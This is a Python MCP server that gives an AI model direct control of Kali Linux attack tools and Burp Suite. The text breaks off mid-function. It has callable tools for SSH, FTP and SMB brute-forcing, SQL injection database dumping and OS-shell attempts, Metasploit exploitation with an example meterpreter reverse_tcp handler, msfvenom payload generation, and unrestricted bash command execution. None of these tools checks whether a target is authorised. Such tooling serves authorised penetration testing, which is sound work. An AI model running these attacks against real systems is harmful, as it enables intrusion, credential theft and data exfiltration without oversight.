#!/usr/bin/env python3
# /// script
# requires-python = ">=3.10"
# dependencies = [
#     "requests>=2,<3",
#     "mcp>=1.2.0,<2",
#     "flask>=3,<4",
#     "websocket-client>=1.6",
# ]
# ///

"""
╔══════════════════════════════════════════════════════════════════════════════╗
║   ALL-TOOLS KALI + BURP SUITE MCP BRIDGE  v3.0                              ║
║                                                                              ║
║  Architecture:                                                               ║
║   Layer 1 → Burp REST API  (web app testing, proxy, scanner, collaborator)  ║
║   Layer 2 → Kali CLI Tools (nmap, nikto, sqlmap, gobuster, ffuf, hydra,    ║
║              masscan, metasploit, whatweb, nuclei, dirb, john, hashcat,     ║
║              fierce, subfinder, amass, wpscan, enum4linux, smbclient,       ║
║              netcat, socat, openssl, curl, wget)                            ║
║   Layer 3 → Pure Python (JWT, CORS, smuggling, entropy, OAuth, GraphQL,    ║
║              payload gen, CVE lookup, GitHub recon, exploit templates)      ║
║                                                                              ║
║  MCP SSE Port: 8082  (--transport sse)                                      ║
║  Burp REST:    http://127.0.0.1:9876  (BurpAI extension)                   ║
╚══════════════════════════════════════════════════════════════════════════════╝

Claude Desktop config:
{
  "mcpServers": {
    "kali-burp": {
      "command": "python3",
      "args": ["/path/to/kali_burp_mcp.py"],
      "env": {
        "BURP_URL": "http://127.0.0.1:9876",
        "BURP_API_KEY": "",
        "TOOL_TIMEOUT": "120"
      }
    }
  }
}
"""

import os, re, sys, json, time, base64, hashlib, hmac, shutil
import logging, argparse, textwrap, threading, socket, ssl, subprocess
import urllib.parse, collections, math, difflib, tempfile
from typing import Optional, Any
from pathlib import Path

# ── Windows asyncio fix ───────────────────────────────────────────────────────
if sys.platform == "win32":
    import asyncio
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

import requests
from mcp.server.fastmcp import FastMCP

# ─────────────────────────────────────────────────────────────────────────────
# CONFIG
# ─────────────────────────────────────────────────────────────────────────────

BURP_URL     = os.getenv("BURP_URL",      "http://127.0.0.1:9876")
BURP_API_KEY = os.getenv("BURP_API_KEY",  "")
HTTP_TIMEOUT = int(os.getenv("TIMEOUT",   "30"))
TOOL_TIMEOUT = int(os.getenv("TOOL_TIMEOUT", "120"))
MCP_SSE_PORT = 8082

NVD_API_URL  = "https://services.nvd.nist.gov/rest/json/cves/2.0"
CRTSH_URL    = "https://crt.sh/?q={}&output=json"
GITHUB_ADV   = "https://api.github.com/advisories"
OUTPUT_DIR   = Path(tempfile.gettempdir()) / "kali_mcp"
OUTPUT_DIR.mkdir(parents=True, exist_ok=True)

logger = logging.getLogger(__name__)
mcp    = FastMCP("kali-burp-mcp")

cfg = {
    "burp_url": BURP_URL,
    "api_key":  BURP_API_KEY,
    "timeout":  HTTP_TIMEOUT,
    "tool_timeout": TOOL_TIMEOUT,
}


# ═════════════════════════════════════════════════════════════════════════════
# ── LAYER 0: CORE HELPERS ────────────────────────────────────────────────────
# ═════════════════════════════════════════════════════════════════════════════

# ── Subprocess runner ─────────────────────────────────────────────────────────

def _run_tool(cmd: list[str], timeout: int = None, stdin_data: str = None,
              env: dict = None) -> dict:
    """Execute a CLI tool and return {stdout, stderr, returncode, command}."""
    timeout = timeout or cfg["tool_timeout"]
    full_env = {**os.environ, **(env or {})}
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout,
            input=stdin_data,
            env=full_env,
        )
        return {
            "command":    " ".join(cmd),
            "stdout":     result.stdout.strip(),
            "stderr":     result.stderr.strip(),
            "returncode": result.returncode,
        }
    except subprocess.TimeoutExpired:
        return {"command": " ".join(cmd), "stdout": "",
                "stderr": f"Timed out after {timeout}s", "returncode": -1}
    except FileNotFoundError:
        return {"command": " ".join(cmd), "stdout": "",
                "stderr": f"Tool not found: {cmd[0]}. Install with: sudo apt-get install -y {cmd[0]}",
                "returncode": -2}
    except Exception as e:
        return {"command": " ".join(cmd), "stdout": "",
                "stderr": str(e), "returncode": -3}

def _which(name: str) -> Optional[str]:
    return shutil.which(name)

def _fmt(res: dict) -> str:
    """Format a _run_tool result into a readable string."""
    lines = [f"$ {res['command']}"]
    if res["stdout"]:
        lines.append(res["stdout"])
    if res["stderr"]:
        lines.append(f"[STDERR] {res['stderr']}")
    lines.append(f"[exit {res['returncode']}]")
    return "\n".join(lines)

# ── Burp REST helpers ─────────────────────────────────────────────────────────

def _burp_get(ep: str, params: dict = None) -> Any:
    url = f"{cfg['burp_url']}/{ep.lstrip('/')}"
    hdrs = {"Authorization": f"Bearer {cfg['api_key']}"} if cfg["api_key"] else {}
    try:
        r = requests.get(url, params=params or {}, headers=hdrs, timeout=cfg["timeout"])
        r.encoding = "utf-8"
        try:    return r.json()
        except: return r.text.strip() if r.ok else f"[HTTP {r.status_code}] {r.text[:500]}"
    except Exception as e:
        return {"error": str(e)}

def _burp_post(ep: str, data: Any = None, raw: str = None) -> Any:
    url = f"{cfg['burp_url']}/{ep.lstrip('/')}"
    hdrs = {"Authorization": f"Bearer {cfg['api_key']}"} if cfg["api_key"] else {}
    try:
        if raw is not None:
            hdrs["Content-Type"] = "text/plain"
            r = requests.post(url, data=raw, headers=hdrs, timeout=cfg["timeout"])
        else:
            r = requests.post(url, json=data, headers=hdrs, timeout=cfg["timeout"])
        r.encoding = "utf-8"
        try:    return r.json()
        except: return r.text.strip() if r.ok else f"[HTTP {r.status_code}] {r.text[:500]}"
    except Exception as e:
        return {"error": str(e)}

def _ext_get(url: str, params: dict = None, headers: dict = None, timeout: int = 20) -> Any:
    try:
        r = requests.get(url, params=params or {}, headers=headers or {}, timeout=timeout)
        r.encoding = "utf-8"
        try:    return r.json()
        except: return r.text.strip()
    except Exception as e:
        return {"error": str(e)}


# ═════════════════════════════════════════════════════════════════════════════
# ── LAYER 1: KALI CLI TOOLS ──────────────────────────────────────────────────
# ═════════════════════════════════════════════════════════════════════════════

# ── Nmap ──────────────────────────────────────────────────────────────────────

@mcp.tool()
def nmap_scan(target: str, flags: str = "-sV -T4 --open") -> str:
    """
    Nmap port/service scan.
    target: IP, hostname, CIDR (e.g. 192.168.1.0/24)
    flags:  e.g. '-sV -T4 -p 80,443' or '-A -T4' or '-sn' (ping sweep)
    """
    cmd = ["nmap"] + flags.split() + [target]
    return _fmt(_run_tool(cmd))

@mcp.tool()
def nmap_vuln_scan(target: str) -> str:
    """Run Nmap with all vuln NSE scripts against target."""
    cmd = ["nmap", "--script", "vuln", "-sV", "-T4", target]
    return _fmt(_run_tool(cmd, timeout=300))

@mcp.tool()
def nmap_os_detect(target: str) -> str:
    """Detect OS + service fingerprinting with Nmap (-O -sV -A)."""
    cmd = ["nmap", "-O", "-sV", "-A", "--osscan-guess", target]
    return _fmt(_run_tool(cmd))

@mcp.tool()
def nmap_full_port_scan(target: str, speed: str = "T4") -> str:
    """Scan all 65535 ports on target (slow but thorough)."""
    cmd = ["nmap", "-p-", f"-{speed}", "--open", "-sV", target]
    return _fmt(_run_tool(cmd, timeout=600))

@mcp.tool()
def nmap_udp_scan(target: str, top_ports: int = 100) -> str:
    """UDP scan top N ports (requires root/sudo)."""
    cmd = ["nmap", "-sU", f"--top-ports={top_ports}", target]
    return _fmt(_run_tool(cmd, timeout=300))

@mcp.tool()
def nmap_script(target: str, script: str, ports: str = "") -> str:
    """
    Run a specific Nmap NSE script.
    script: e.g. 'http-headers', 'smb-vuln-ms17-010', 'ftp-anon'
    ports:  optional, e.g. '21,22,80,443'
    """
    cmd = ["nmap", "--script", script]
    if ports:
        cmd += ["-p", ports]
    cmd.append(target)
    return _fmt(_run_tool(cmd, timeout=180))

# ── Masscan ───────────────────────────────────────────────────────────────────

@mcp.tool()
def masscan_fast(target: str, ports: str = "1-65535", rate: int = 1000) -> str:
    """
    Ultra-fast port scan with masscan.
    rate: packets/second (be careful on networks you don't own)
    """
    cmd = ["masscan", target, "-p", ports, "--rate", str(rate)]
    return _fmt(_run_tool(cmd, timeout=300))

# ── Nikto ─────────────────────────────────────────────────────────────────────

@mcp.tool()
def nikto_scan(host: str, port: int = 80, ssl: bool = False,
               extra_flags: str = "") -> str:
    """
    Nikto web server vulnerability scan.
    host: hostname or IP (no http://)
    ssl:  set True for HTTPS
    """
    cmd = ["nikto", "-h", host, "-p", str(port), "-Format", "txt"]
    if ssl:
        cmd += ["-ssl"]
    if extra_flags:
        cmd += extra_flags.split()
    return _fmt(_run_tool(cmd, timeout=600))

@mcp.tool()
def nikto_scan_url(url: str, extra_flags: str = "") -> str:
    """Nikto scan using a full URL (auto-detects SSL from https://)."""
    cmd = ["nikto", "-h", url, "-Format", "txt"]
    if extra_flags:
        cmd += extra_flags.split()
    return _fmt(_run_tool(cmd, timeout=600))

# ── Gobuster / Dirb / Dirsearch ───────────────────────────────────────────────

@mcp.tool()
def gobuster_dir(url: str,
                  wordlist: str = "/usr/share/wordlists/dirb/common.txt",
                  extensions: str = "php,html,txt,bak,zip",
                  threads: int = 20,
                  extra: str = "") -> str:
    """
    Gobuster directory brute-force.
    wordlist: path to wordlist (default: dirb/common.txt)
    extensions: comma-separated file extensions to test
    """
    cmd = ["gobuster", "dir", "-u", url, "-w", wordlist,
           "-x", extensions, "-t", str(threads), "-q"]
    if extra:
        cmd += extra.split()
    return _fmt(_run_tool(cmd, timeout=300))

@mcp.tool()
def gobuster_dns(domain: str,
                  wordlist: str = "/usr/share/wordlists/subdomains-top1million-5000.txt",
                  threads: int = 20) -> str:
    """Gobuster subdomain brute-force via DNS."""
    cmd = ["gobuster", "dns", "-d", domain, "-w", wordlist, "-t", str(threads), "-q"]
    return _fmt(_run_tool(cmd, timeout=300))

@mcp.tool()
def gobuster_vhost(url: str, domain: str,
                    wordlist: str = "/usr/share/wordlists/subdomains-top1million-5000.txt") -> str:
    """Gobuster virtual host brute-force."""
    cmd = ["gobuster", "vhost", "-u", url, "--domain", domain, "-w", wordlist, "-q"]
    return _fmt(_run_tool(cmd, timeout=300))

@mcp.tool()
def dirb_scan(url: str,
               wordlist: str = "/usr/share/wordlists/dirb/common.txt",
               extra: str = "") -> str:
    """Dirb directory scan (fallback if gobuster not available)."""
    cmd = ["dirb", url, wordlist]
    if extra:
        cmd += extra.split()
    return _fmt(_run_tool(cmd, timeout=300))

# ── FFuf ──────────────────────────────────────────────────────────────────────

@mcp.tool()
def ffuf_dir(url: str,
              wordlist: str = "/usr/share/wordlists/dirb/common.txt",
              extensions: str = "php,html,txt",
              threads: int = 40,
              extra: str = "") -> str:
    """
    FFUF directory fuzzing. Appends FUZZ to URL.
    url: base URL (e.g. https://target.com/FUZZ)
    """
    if "FUZZ" not in url:
        url = url.rstrip("/") + "/FUZZ"
    cmd = ["ffuf", "-u", url, "-w", wordlist, "-e", extensions,
           "-t", str(threads), "-mc", "200,204,301,302,307,401,403"]
    if extra:
        cmd += extra.split()
    return _fmt(_run_tool(cmd, timeout=300))

@mcp.tool()
def ffuf_param(url: str, wordlist: str, method: str = "GET",
                data: str = "", extra: str = "") -> str:
    """
    FFUF parameter fuzzing. Place FUZZ in URL or data.
    """
    cmd = ["ffuf", "-u", url, "-w", wordlist, "-X", method.upper()]
    if data:
        cmd += ["-d", data]
    if extra:
        cmd += extra.split()
    return _fmt(_run_tool(cmd, timeout=300))

# ── SQLMap ────────────────────────────────────────────────────────────────────

@mcp.tool()
def sqlmap_scan(url: str, extra_args: str = "") -> str:
    """
    SQLMap SQL injection test.
    extra_args: e.g. '--level=3 --risk=2 --dbms=mysql'
    """
    out_dir = str(OUTPUT_DIR / "sqlmap")
    cmd = ["sqlmap", "-u", url, "--batch", "--output-dir", out_dir]
    if extra_args:
        cmd += extra_args.split()
    return _fmt(_run_tool(cmd, timeout=300))

@mcp.tool()
def sqlmap_dbs(url: str) -> str:
    """SQLMap — enumerate databases."""
    cmd = ["sqlmap", "-u", url, "--batch", "--dbs"]
    return _fmt(_run_tool(cmd, timeout=180))

@mcp.tool()
def sqlmap_tables(url: str, database: str) -> str:
    """SQLMap — enumerate tables in a database."""
    cmd = ["sqlmap", "-u", url, "--batch", "-D", database, "--tables"]
    return _fmt(_run_tool(cmd, timeout=180))

@mcp.tool()
def sqlmap_dump(url: str, database: str = "", table: str = "") -> str:
    """SQLMap — dump data from database/table."""
    cmd = ["sqlmap", "-u", url, "--batch", "--dump"]
    if database:
        cmd += ["-D", database]
    if table:
        cmd += ["-T", table]
    return _fmt(_run_tool(cmd, timeout=300))

@mcp.tool()
def sqlmap_os_shell(url: str) -> str:
    """SQLMap — attempt OS shell via SQL injection."""
    cmd = ["sqlmap", "-u", url, "--batch", "--os-shell"]
    return _fmt(_run_tool(cmd, timeout=180))

@mcp.tool()
def sqlmap_request_file(request_file: str, extra_args: str = "") -> str:
    """
    SQLMap with a saved Burp request file.
    request_file: path to saved HTTP request (e.g. from Burp 'Save item')
    """
    cmd = ["sqlmap", "-r", request_file, "--batch"]
    if extra_args:
        cmd += extra_args.split()
    return _fmt(_run_tool(cmd, timeout=300))

# ── Hydra ─────────────────────────────────────────────────────────────────────

@mcp.tool()
def hydra_ssh(target: str, userlist: str, passlist: str, port: int = 22) -> str:
    """Hydra SSH brute-force."""
    cmd = ["hydra", "-L", userlist, "-P", passlist,
           f"ssh://{target}:{port}", "-t", "4", "-V"]
    return _fmt(_run_tool(cmd, timeout=300))

@mcp.tool()
def hydra_http_post(target: str, path: str, post_data: str,
                     fail_string: str, userlist: str, passlist: str) -> str:
    """
    Hydra HTTP POST form brute-force.
    post_data: e.g. 'username=^USER^&password=^PASS^'
    fail_string: string present when login fails (e.g. 'Invalid password')
    """
    cmd = ["hydra", "-L", userlist, "-P", passlist,
           target, "http-post-form",
           f"{path}:{post_data}:F={fail_string}"]
    return _fmt(_run_tool(cmd, timeout=300))

@mcp.tool()
def hydra_ftp(target: str, userlist: str, passlist: str) -> str:
    """Hydra FTP brute-force."""
    cmd = ["hydra", "-L", userlist, "-P", passlist, f"ftp://{target}"]
    return _fmt(_run_tool(cmd, timeout=180))

@mcp.tool()
def hydra_smb(target: str, userlist: str, passlist: str) -> str:
    """Hydra SMB brute-force."""
    cmd = ["hydra", "-L", userlist, "-P", passlist, f"smb://{target}"]
    return _fmt(_run_tool(cmd, timeout=180))

@mcp.tool()
def hydra_service(target: str, service: str,
                   userlist: str, passlist: str) -> str:
    """
    Hydra generic service brute-force.
    service: ssh | ftp | smb | rdp | telnet | smtp | pop3 | imap | mysql | mssql
    """
    cmd = ["hydra", "-L", userlist, "-P", passlist,
           f"{service}://{target}", "-V"]
    return _fmt(_run_tool(cmd, timeout=300))

# ── John the Ripper / Hashcat ─────────────────────────────────────────────────

@mcp.tool()
def john_crack(hash_file: str, wordlist: str = "/usr/share/wordlists/rockyou.txt",
                rules: str = "") -> str:
    """
    John the Ripper hash cracking.
    hash_file: file containing hashes (one per line)
    """
    cmd = ["john", hash_file, f"--wordlist={wordlist}"]
    if rules:
        cmd.append(f"--rules={rules}")
    return _fmt(_run_tool(cmd, timeout=600))

@mcp.tool()
def john_show(hash_file: str) -> str:
    """Show cracked passwords from John."""
    return _fmt(_run_tool(["john", "--show", hash_file]))

@mcp.tool()
def hashcat_crack(hash_file: str, hash_type: int, wordlist: str = "/usr/share/wordlists/rockyou.txt",
                   attack_mode: int = 0, extra: str = "") -> str:
    """
    Hashcat GPU hash cracking.
    hash_type: 0=MD5, 100=SHA1, 1000=NTLM, 1800=sha512crypt, 3200=bcrypt
    attack_mode: 0=dictionary, 3=brute-force, 6=hybrid
    """
    cmd = ["hashcat", "-m", str(hash_type), "-a", str(attack_mode),
           hash_file, wordlist, "--force", "--quiet"]
    if extra:
        cmd += extra.split()
    return _fmt(_run_tool(cmd, timeout=600))

# ── WhatWeb / WebTech ─────────────────────────────────────────────────────────

@mcp.tool()
def whatweb_scan(url: str, aggression: int = 3) -> str:
    """
    WhatWeb technology fingerprinting.
    aggression: 1=stealthy, 3=aggressive (more requests), 4=heavy
    """
    cmd = ["whatweb", f"--aggression={aggression}", url]
    return _fmt(_run_tool(cmd))

# ── WPScan ────────────────────────────────────────────────────────────────────

@mcp.tool()
def wpscan(url: str, enumerate: str = "u,vp,vt,tt",
            api_token: str = "") -> str:
    """
    WPScan WordPress vulnerability scanner.
    enumerate: u=users, vp=vulnerable plugins, vt=vulnerable themes, tt=timthumbs
    api_token: WPScan API token for vulnerability database
    """
    cmd = ["wpscan", "--url", url, "--enumerate", enumerate,
           "--format", "cli", "--no-update"]
    if api_token:
        cmd += ["--api-token", api_token]
    return _fmt(_run_tool(cmd, timeout=300))

# ── Enum4Linux ────────────────────────────────────────────────────────────────

@mcp.tool()
def enum4linux(target: str, flags: str = "-a") -> str:
    """
    Enum4linux SMB/LDAP enumeration (Linux/Windows).
    flags: -a (all), -u (users), -s (shares), -g (groups), -i (printer info)
    """
    cmd = ["enum4linux"] + flags.split() + [target]
    return _fmt(_run_tool(cmd, timeout=180))

# ── SMBClient ─────────────────────────────────────────────────────────────────

@mcp.tool()
def smbclient_list_shares(target: str, username: str = "",
                           password: str = "") -> str:
    """List SMB shares on target."""
    cmd = ["smbclient", "-L", f"//{target}"]
    if username:
        cmd += ["-U", f"{username}%{password}"]
    else:
        cmd += ["-N"]
    return _fmt(_run_tool(cmd, timeout=30))

@mcp.tool()
def smbclient_connect(target: str, share: str,
                       username: str = "", password: str = "",
                       command: str = "ls") -> str:
    """Connect to an SMB share and run a command."""
    cmd = ["smbclient", f"//{target}/{share}", "-c", command]
    if username:
        cmd += ["-U", f"{username}%{password}"]
    else:
        cmd += ["-N"]
    return _fmt(_run_tool(cmd, timeout=30))

# ── DNS Recon ─────────────────────────────────────────────────────────────────

@mcp.tool()
def dig_query(domain: str, record_type: str = "ANY",
               nameserver: str = "") -> str:
    """DNS query using dig."""
    cmd = ["dig", domain, record_type]
    if nameserver:
        cmd += [f"@{nameserver}"]
    return _fmt(_run_tool(cmd))

@mcp.tool()
def fierce_dns(domain: str) -> str:
    """Fierce DNS reconnaissance and subdomain brute-force."""
    cmd = ["fierce", "--domain", domain]
    return _fmt(_run_tool(cmd, timeout=300))

@mcp.tool()
def dnsx_resolve(domain: str) -> str:
    """Fast DNS resolution and enumeration with dnsx."""
    cmd = ["dnsx", "-d", domain, "-a", "-cname", "-mx", "-ns", "-silent"]
    return _fmt(_run_tool(cmd, timeout=60))

# ── Subfinder / Amass ─────────────────────────────────────────────────────────

@mcp.tool()
def subfinder_enum(domain: str, silent: bool = True) -> str:
    """Subfinder passive subdomain enumeration (OSINT-based)."""
    cmd = ["subfinder", "-d", domain]
    if silent:
        cmd.append("-silent")
    return _fmt(_run_tool(cmd, timeout=120))

@mcp.tool()
def amass_enum(domain: str, passive: bool = True) -> str:
    """
    Amass subdomain enumeration.
    passive=True uses only passive sources (safer, no active probing)
    """
    cmd = ["amass", "enum", "-d", domain]
    if passive:
        cmd.append("-passive")
    return _fmt(_run_tool(cmd, timeout=300))

# ── Nuclei ────────────────────────────────────────────────────────────────────

@mcp.tool()
def nuclei_scan(target: str, templates: str = "",
                 severity: str = "medium,high,critical",
                 rate_limit: int = 100) -> str:
    """
    Nuclei vulnerability scanner with community templates.
    templates: path or tag e.g. 'cves' or '/path/to/templates'
    severity:  info | low | medium | high | critical (comma-separated)
    """
    cmd = ["nuclei", "-u", target, "-severity", severity,
           "-rate-limit", str(rate_limit), "-silent"]
    if templates:
        cmd += ["-t", templates]
    return _fmt(_run_tool(cmd, timeout=600))

@mcp.tool()
def nuclei_scan_list(targets_file: str, severity: str = "high,critical") -> str:
    """Nuclei scan from a file containing target URLs (one per line)."""
    cmd = ["nuclei", "-l", targets_file, "-severity", severity, "-silent"]
    return _fmt(_run_tool(cmd, timeout=600))

# ── Metasploit ────────────────────────────────────────────────────────────────

@mcp.tool()
def msf_run_resource(resource_script: str) -> str:
    """
    Run a Metasploit resource script (multi-line MSF commands).
    Example resource_script:
      use exploit/multi/handler
      set PAYLOAD windows/meterpreter/reverse_tcp
      set LHOST 192.168.1.10
      set LPORT 4444
      run
    """
    with tempfile.NamedTemporaryFile(mode="w", suffix=".rc",
                                      delete=False, dir=str(OUTPUT_DIR)) as f:
        f.write(resource_script)
        rc_path = f.name
    cmd = ["msfconsole", "-q", "-r", rc_path]
    result = _run_tool(cmd, timeout=300)
    try: os.unlink(rc_path)
    except: pass
    return _fmt(result)

@mcp.tool()
def msf_search(query: str) -> str:
    """Search Metasploit module database."""
    script = f"search {query}\nexit\n"
    return msf_run_resource(script)

@mcp.tool()
def msf_module_info(module_path: str) -> str:
    """Get info about a specific Metasploit module."""
    script = f"use {module_path}\ninfo\nexit\n"
    return msf_run_resource(script)

@mcp.tool()
def msf_exploit(module: str, rhosts: str, lhost: str = "",
                 lport: int = 4444, payload: str = "",
                 extra_options: str = "") -> str:
    """
    Run a Metasploit exploit with common options.
    module: e.g. 'exploit/windows/smb/ms17_010_eternalblue'
    payload: e.g. 'windows/x64/meterpreter/reverse_tcp'
    extra_options: additional SET commands, one per line
    """
    lines = [
        f"use {module}",
        f"set RHOSTS {rhosts}",
    ]
    if lhost:
        lines.append(f"set LHOST {lhost}")
    if lport:
        lines.append(f"set LPORT {lport}")
    if payload:
        lines.append(f"set PAYLOAD {payload}")
    if extra_options:
        lines += extra_options.strip().splitlines()
    lines += ["run -j", "sleep 5", "sessions -l", "exit"]
    return msf_run_resource("\n".join(lines))

@mcp.tool()
def msf_generate_payload(payload: str, lhost: str, lport: int = 4444,
                           format: str = "exe", output_file: str = "") -> str:
    """
    Generate a payload using msfvenom.
    payload: e.g. 'windows/meterpreter/reverse_tcp'
    format:  exe | elf | raw | python | bash | ps1 | dll | apk
    """
    out = output_file or str(OUTPUT_DIR / f"payload_{int(time.time())}.{format}")
    cmd = ["msfvenom", "-p", payload,
           f"LHOST={lhost}", f"LPORT={lport}",
           "-f", format, "-o", out]
    result = _run_tool(cmd, timeout=120)
    result["output_file"] = out
    return _fmt(result) + f"\n[Output: {out}]"

# ── SSL / TLS ─────────────────────────────────────────────────────────────────

@mcp.tool()
def sslscan(host: str, port: int = 443) -> str:
    """SSLScan — test SSL/TLS configuration, ciphers, and vulnerabilities."""
    cmd = ["sslscan", f"--connect-timeout=10", f"{host}:{port}"]
    return _fmt(_run_tool(cmd, timeout=60))

@mcp.tool()
def testssl(host: str, port: int = 443) -> str:
    """testssl.sh — comprehensive SSL/TLS testing (if installed)."""
    cmd = ["testssl.sh", "--fast", f"{host}:{port}"]
    return _fmt(_run_tool(cmd, timeout=120))

@mcp.tool()
def openssl_check_cert(host: str, port: int = 443) -> str:
    """Get and display SSL certificate info for a host."""
    cmd = ["openssl", "s_client", "-connect", f"{host}:{port}",
           "-servername", host, "-showcerts"]
    result = _run_tool(cmd, stdin_data="", timeout=15)
    return _fmt(result)

# ── Network Tools ─────────────────────────────────────────────────────────────

@mcp.tool()
def whois_lookup(target: str) -> str:
    """WHOIS lookup for domain or IP."""
    return _fmt(_run_tool(["whois", target]))

@mcp.tool()
def curl_request(url: str, method: str = "GET",
                  headers: str = "", data: str = "",
                  follow_redirects: bool = True,
                  proxy: str = "") -> str:
    """
    curl HTTP request with full control.
    headers: one per line (e.g. 'Authorization: Bearer token\\nX-Custom: val')
    proxy: e.g. 'http://127.0.0.1:8080' to route through Burp
    """
    cmd = ["curl", "-s", "-i", "-X", method.upper()]
    if follow_redirects:
        cmd.append("-L")
    for h in headers.splitlines():
        if h.strip():
            cmd += ["-H", h.strip()]
    if data:
        cmd += ["-d", data]
    if proxy:
        cmd += ["--proxy", proxy, "-k"]
    cmd.append(url)
    return _fmt(_run_tool(cmd, timeout=30))

@mcp.tool()
def wget_download(url: str, output_path: str = "") -> str:
    """Download a file with wget."""
    cmd = ["wget", "-q", url]
    if output_path:
        cmd += ["-O", output_path]
    return _fmt(_run_tool(cmd, timeout=120))

@mcp.tool()
def nc_banner_grab(host: str, port: int, timeout: int = 5) -> str:
    """Grab service banner using netcat."""
    cmd = ["nc", "-w", str(timeout), "-v", host, str(port)]
    return _fmt(_run_tool(cmd, stdin_data="\n", timeout=timeout + 2))

# ── Tool Management ───────────────────────────────────────────────────────────

_TOOL_PACKAGES = {
    "nmap":       "nmap",
    "masscan":    "masscan",
    "nikto":      "nikto",
    "gobuster":   "gobuster",
    "dirb":       "dirb",
    "ffuf":       "ffuf",
    "hydra":      "hydra",
    "john":       "john",
    "hashcat":    "hashcat",
    "whatweb":    "whatweb",
    "wpscan":     "wpscan",
    "enum4linux": "enum4linux",
    "sqlmap":     "sqlmap",
    "nuclei":     "nuclei",
    "msfconsole": "metasploit-framework",
    "msfvenom":   "metasploit-framework",
    "sslscan":    "sslscan",
    "subfinder":  "subfinder",
    "amass":      "amass",
    "fierce":     "fierce",
    "dnsx":       "dnsx",
    "smbclient":  "smbclient",
    "nc":         "netcat-openbsd",
    "curl":       "curl",
    "wget":       "wget",
    "whois":      "whois",
    "dig":        "dnsutils",
}

@mcp.tool()
def install_tool(tool_name: str) -> str:
    """
    Install a security tool via apt-get, pip, or go install.
    tool_name: nmap | nikto | gobuster | sqlmap | ffuf | hydra | nuclei |
               msfconsole | whatweb | wpscan | enum4linux | masscan | etc.
    """
    tool = tool_name.lower().strip()

    if _which(tool):
        return f"[OK] {tool} already installed at {_which(tool)}"

    pkg = _TOOL_PACKAGES.get(tool, tool)

    # Try apt-get
    if _which("apt-get"):
        result = _run_tool(["sudo", "apt-get", "install", "-y", pkg], timeout=300)
        if result["returncode"] == 0:
            return f"[OK] Installed {tool} via apt-get"

    # Try pip
    pip_result = _run_tool([sys.executable, "-m", "pip", "install", tool, "-q"],
                            timeout=120)
    if pip_result["returncode"] == 0:
        return f"[OK] Installed {tool} via pip"

    # Try go install for Go tools
    if tool in ("nuclei", "subfinder", "amass", "ffuf", "gobuster", "dnsx") and _which("go"):
        go_map = {
            "nuclei":    "github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest",
            "subfinder": "github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest",
            "dnsx":      "github.com/projectdiscovery/dnsx/cmd/dnsx@latest",
            "ffuf":      "github.com/ffuf/ffuf/v2@latest",
            "gobuster":  "github.com/OJ/gobuster/v3@latest",
        }
        if tool in go_map:
            res = _run_tool(["go", "install", go_map[tool]], timeout=300,
                            env={"GOPATH": str(Path.home() / "go"),
                                 "PATH": os.environ.get("PATH", "") + ":" + str(Path.home() / "go/bin")})
            if res["returncode"] == 0:
                return f"[OK] Installed {tool} via go install"

    return f"[FAILED] Could not install {tool}. Try manually: sudo apt-get install {pkg}"

@mcp.tool()
def list_installed_tools() -> dict:
    """List all security tools — installed (✓) and missing (✗)."""
    all_tools = list(_TOOL_PACKAGES.keys()) + [
        "python3", "ruby", "perl", "java", "git", "gcc",
        "socat", "tcpdump", "wireshark", "burpsuite",
        "openssl", "ssh", "ftp", "telnet",
    ]
    installed, missing = [], []
    for t in sorted(set(all_tools)):
        path = _which(t)
        if path:
            installed.append(f"✓ {t:20} → {path}")
        else:
            missing.append(f"✗ {t}")
    return {
        "installed_count": len(installed),
        "missing_count":   len(missing),
        "installed":       installed,
        "missing":         missing,
    }

@mcp.tool()
def run_command(command: str, timeout: int = 60) -> str:
    """
    Run any arbitrary shell command via bash.
    Use with care — full system access.
    """
    result = _run_tool(["bash", "-c", command], timeout=timeout)
    return _fmt(result)

@mcp.tool()
def install_wordlists() -> str:
    """Install common wordlists (rockyou, dirb, seclists, dirbuster)."""
    cmds = [
        ["sudo", "apt-get", "install", "-y", "wordlists", "seclists"],
        ["sudo", "gunzip", "/usr/share/wordlists/rockyou.txt.gz"],
    ]
    results = []
    for cmd in cmds:
        r = _run_tool(cmd, timeout=300)
        results.append(_fmt(r))
    return "\n---\n".join(results)


# ═════════════════════════════════════════════════════════════════════════════
# ── LAYER 2: BURP REST API TOOLS ────────────────────────────────────────────
# ═════════════════════════════════════════════════════════════════════════════

@mcp.tool()
def burp_health_check() -> dict:
    """Check Burp REST API connectivity and list all features."""
    try:
        r = requests.get(f"{cfg['burp_url']}/health", timeout=5)
        status = "connected" if r.ok else f"HTTP_{r.status_code}"
    except Exception as e:
        status = f"unreachable: {e}"
    return {"burp_url": cfg["burp_url"], "status": status,
            "api_key_set": bool(cfg["api_key"])}

# ── Encoding ──────────────────────────────────────────────────────────────────

@mcp.tool()
def base64_decode(value: str) -> str:
    """Base64 decode via Burp."""
    return _burp_post("base64_decode", raw=value)

@mcp.tool()
def base64_encode(value: str) -> str:
    """Base64 encode via Burp."""
    return _burp_post("base64_encode", raw=value)

@mcp.tool()
def url_decode(value: str) -> str:
    """URL decode via Burp."""
    return _burp_post("url_decode", raw=value)

@mcp.tool()
def url_encode(value: str) -> str:
    """URL encode via Burp."""
    return _burp_post("url_encode", raw=value)

@mcp.tool()
def generate_random_string(length: int = 16, charset: str = "alphanumeric") -> str:
    """Generate random string via Burp."""
    return _burp_post("generate_random_string", {"length": length, "charset": charset})

# ── Proxy ─────────────────────────────────────────────────────────────────────

@mcp.tool()
def get_proxy_http_history(limit: int = 100, offset: int = 0) -> Any:
    """Get Burp proxy HTTP history."""
    return _burp_get("get_proxy_http_history", {"limit": limit, "offset": offset})

@mcp.tool()
def get_proxy_http_history_regex(pattern: str, limit: int = 100) -> Any:
    """Filter Burp HTTP history by regex."""
    return _burp_get("get_proxy_http_history_regex", {"pattern": pattern, "limit": limit})

@mcp.tool()
def get_proxy_websocket_history(limit: int = 50) -> Any:
    """Get Burp WebSocket history."""
    return _burp_get("get_proxy_websocket_history", {"limit": limit})

@mcp.tool()
def get_proxy_websocket_history_regex(pattern: str) -> Any:
    """Filter Burp WebSocket history by regex."""
    return _burp_get("get_proxy_websocket_history_regex", {"pattern": pattern})

@mcp.tool()
def set_proxy_intercept_state(enabled: bool) -> Any:
    """Enable/disable Burp Proxy intercept."""
